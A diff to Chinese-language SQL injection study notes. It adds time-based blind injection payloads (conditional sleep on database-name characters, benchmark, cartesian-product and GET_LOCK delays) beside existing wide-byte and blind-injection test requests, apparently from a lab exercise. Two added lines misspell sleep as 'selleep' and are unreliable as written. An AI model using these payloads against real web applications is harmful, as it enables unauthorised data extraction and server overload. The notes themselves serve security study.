@@ -152,6 +152,20 @@ GET /sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/cat1.jpg%df%27%20union%20sele
 ``` 
 // 判断是否存在盲注
 ?username=admin' and sleep(3) %23
+
+select * from table where id = 1 and (if(substr(database(),1,1)=' ',selleep(4),null))
+select * from table where id = 1 and (if(ascii(substr(database(),1,1))=100,selleep(4),null))
+
+// benchmark
+select benchmark(10000000000,sha(1))
+
+// 笛卡尔积
+select count(*) from information_schema.columns A, information_schema.columns B,information_schema.tables C;
+
+// GET_LOCK
+select GET_LOCK(' a', 1)
+
+
 ```
 
 ## head注入
